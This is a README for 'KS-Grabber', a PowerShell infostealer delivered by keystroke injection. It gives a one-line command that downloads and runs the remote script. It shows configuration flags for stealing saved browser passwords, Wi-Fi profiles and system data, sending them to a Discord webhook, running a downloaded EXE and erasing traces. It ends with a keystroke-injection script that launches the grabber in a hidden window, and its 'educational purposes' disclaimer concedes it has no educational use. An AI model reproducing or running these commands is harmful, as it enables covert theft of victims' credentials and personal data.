# ✨ KS-Grabber

KS-Grabber is a keystroke injection grabber that is fully modular and developed with PowerShell. This script allows you to collect information from various sources and send it to a webhook.

## Usage

Run the following command in PowerShell to execute KS-Grabber:

```powershell
$hookUrl = '<webhook goes here>'
iex (iwr https://raw.githubusercontent.com/Niximkk/ks-grabber/main/ks-grabber.ps1).content
```

## Configuration

Before running the script, you need to configure the boolean variables that enable the grabber modules. Open the script and set the following variables:

```powershell
$gatherPcData = $true  <# Gather PC data #>
$gatherWifiProfiles = $true  <# Gather WiFi profiles #>
$gatherOpenPorts = $true  <# Gather open ports #>
$executeExe = $false  <# Execute and EXE File #>
$gatherInstalledSoftware = $true <# Gather installed softwares #>
$gatherBrowserPass = $true <# Gather passwords saved in browsers #>
$removeTraces = $true  <# Remove traces #>
```

You can also change some extra variables according to your preferences regarding the modules:

```powershell
$keyContentLabel = "Key Content"  <# Only if the system is not in en-us or en-br. #>
$exeUrl = "https://somerandomwebsite.lol/yourfile.exe" <# The EXE file referring to the executeExe function. #>
```

**WARNING:** It is mandatory to configure the webhook correctly. Replace the value of the `$hookUrl` variable with your webhook:

```powershell
$hookUrl = "https://discord.com/api/webhooks/wompwomp"
```

Otherwise, the script will not work!

## Example Attack

Here is an example attack using the grabber:

```plaintext
GUI r
DELAY 1000
STRING cmd
ENTER
DELAY 1000
STRING powershell -windowstyle hidden -command "$hookUrl = '<webhook goes here>'; iex (iwr https://raw.githubusercontent.com/Niximkk/ks-grabber/main/ks-grabber.ps1).content"
ENTER
```
### ⭐ Made for educational purposes (even though I don't know how it can be used in an educational way), I am not responsible for how this tool is used.
